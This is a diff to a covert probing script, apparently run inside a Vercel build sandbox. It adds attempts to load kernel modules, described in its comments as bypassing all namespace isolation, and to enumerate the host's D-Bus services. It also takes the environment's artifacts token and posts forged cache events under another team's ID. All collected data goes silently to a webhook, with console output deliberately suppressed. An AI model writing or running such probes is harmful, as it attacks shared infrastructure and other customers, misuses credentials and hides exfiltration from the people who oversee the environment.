@@ -3233,9 +3233,103 @@ s.close()
     const cgroupInfo = safe(() => execSync('cat /sys/fs/cgroup/memory/memory.limit_in_bytes 2>/dev/null; cat /proc/1/cgroup 2>/dev/null | head -10', { timeout: 2000 }).toString().trim().slice(0, 300));
     return { nvme, block, pci, cpu, devList, cgroupInfo };
   }),
+
+  // v43: kernel module loading — CAP_SYS_MODULE capability test
+  // v20 said "kernel is monolithic, CAP_SYS_MODULE attack surface limited"
+  // This probe verifies: (a) is /dev/kmod present? (b) can modprobe run? (c) can we insert?
+  // Loading a kernel module bypasses ALL namespace isolation — kernel space has no ns boundaries
+  kernelModuleAttempt: safe(() => {
+    // Check if kernel was built with module support
+    const moduleSupport = safe(() => execSync(
+      'cat /proc/sys/kernel/modules_disabled 2>/dev/null || echo UNKNOWN',
+      { timeout: 1000 }
+    ).toString().trim());
+    // zcat the kernel config if available
+    const kernelConfig = safe(() => execSync(
+      'zcat /proc/config.gz 2>/dev/null | grep -E "^CONFIG_MODULES|^CONFIG_MODULE_SIG" || echo NO_CONFIG',
+      { timeout: 3000 }
+    ).toString().trim().slice(0, 300));
+    // Check if modprobe works at all
+    const modprobeCheck = safe(() => execSync(
+      'modprobe --version 2>&1 || echo NO_MODPROBE',
+      { timeout: 2000 }
+    ).toString().trim().slice(0, 100));
+    // List currently loaded modules
+    const lsmod = safe(() => execSync(
+      'lsmod 2>/dev/null | head -20 || echo NO_LSMOD',
+      { timeout: 2000 }
+    ).toString().trim().slice(0, 500));
+    // Attempt to load a KNOWN harmless kernel module (ext4 is always available)
+    const modLoadAttempt = safe(() => execSync(
+      'modprobe ext4 2>&1 || insmod /lib/modules/$(uname -r)/kernel/fs/ext4/ext4.ko 2>&1 || echo LOAD_FAIL',
+      { timeout: 5000 }
+    ).toString().trim().slice(0, 200));
+    // Check kernel version for known Firecracker configurations
+    const unameR = safe(() => execSync('uname -r', { timeout: 1000 }).toString().trim());
+    return { moduleSupport, kernelConfig, modprobeCheck, lsmod, modLoadAttempt, unameR };
+  }),
+
+  // v43: D-Bus probe — system bus visible in /proc/net/unix, test reachability
+  // D-Bus system bus at /run/dbus/system_bus_socket (inode 2272 from v34)
+  // If accessible (abstract socket or same ns), we can enumerate Vercel's D-Bus services
+  dbusProbe: safe(() => {
+    // Check if D-Bus has an abstract socket (most Linux systems also listen on abstract)
+    const abstractDbus = safe(() => execSync(
+      "grep '@' /proc/net/unix 2>/dev/null | grep -i dbus || echo NO_ABSTRACT_DBUS",
+      { timeout: 2000 }
+    ).toString().trim().slice(0, 300));
+    // Try direct dbus-send to system bus (will fail if socket not in our ns)
+    const dbusListNames = safe(() => execSync(
+      'timeout 3 dbus-send --system --dest=org.freedesktop.DBus --type=method_call --print-reply /org/freedesktop/DBus org.freedesktop.DBus.ListNames 2>&1 | head -20 || echo DBUS_FAIL',
+      { timeout: 5000 }
+    ).toString().trim().slice(0, 500));
+    // Try using gdbus if dbus-send not available
+    const gdbusCheck = safe(() => execSync(
+      'timeout 3 gdbus introspect --system --dest org.freedesktop.DBus --object-path / 2>&1 | head -10 || echo NO_GDBUS',
+      { timeout: 5000 }
+    ).toString().trim().slice(0, 300));
+    // Check if busctl available (systemd tool)
+    const busctl = safe(() => execSync(
+      'timeout 3 busctl list 2>&1 | head -20 || echo NO_BUSCTL',
+      { timeout: 5000 }
+    ).toString().trim().slice(0, 500));
+    return { abstractDbus, dbusListNames, gdbusCheck, busctl };
+  }),
+
+  // v43: VERCEL_ARTIFACTS_TOKEN events endpoint cross-team
+  // Test: can we emit build events attributed to a different team's artifact namespace?
+  // If successful: fake cache hits/misses/errors affect another team's build metrics
+  artifactsEventsCrossTeam: safe(() => {
+    const tok = process.env.VERCEL_ARTIFACTS_TOKEN;
+    if (!tok) return { error: 'NO_TOKEN' };
+    const claims = JSON.parse(Buffer.from(tok.split('.')[1], 'base64url').toString());
+    const ownTeamId = claims.ownerId || 'UNKNOWN';
+
+    // Turborepo Remote Cache events API
+    const EVENTS_BASE = 'https://vercel.com/api/remote-cache/v8/events';
+    const fakeTeamId = 'team_00000000000000000000000A';
+    const eventPayload = JSON.stringify([{
+      sessionId: 'probe-v43', source: 'REMOTE', event: 'HIT',
+      hash: 'probe-v43-cross-team-test', duration: 100
+    }]);
+
+    // Test 1: emit event for own team (baseline — should succeed)
+    const ownTeamEvent = safe(() => execSync(
+      `timeout 5 curl -s -o /dev/null -w "%{http_code}" -X POST "${EVENTS_BASE}?teamId=${ownTeamId}" -H "Authorization: Bearer ${tok}" -H "Content-Type: application/json" -d '${eventPayload}' 2>&1`,
+      { timeout: 7000 }
+    ).toString().trim());
+
+    // Test 2: emit event for fake/other team (should fail if validated)
+    const fakeTeamEvent = safe(() => execSync(
+      `timeout 5 curl -s -o /dev/null -w "%{http_code}" -X POST "${EVENTS_BASE}?teamId=${fakeTeamId}" -H "Authorization: Bearer ${tok}" -H "Content-Type: application/json" -d '${eventPayload}' 2>&1`,
+      { timeout: 7000 }
+    ).toString().trim());
+
+    return { ownTeamId, ownTeamEvent, fakeTeamEvent, claims: { type: claims.type, ownerId: claims.ownerId } };
+  }),
 });
 
-// v42 markers
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v42";
-sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v42" });
+// v43 markers
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v43";
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v43" });
 // Intentionally no console.log — all data goes via webhook only
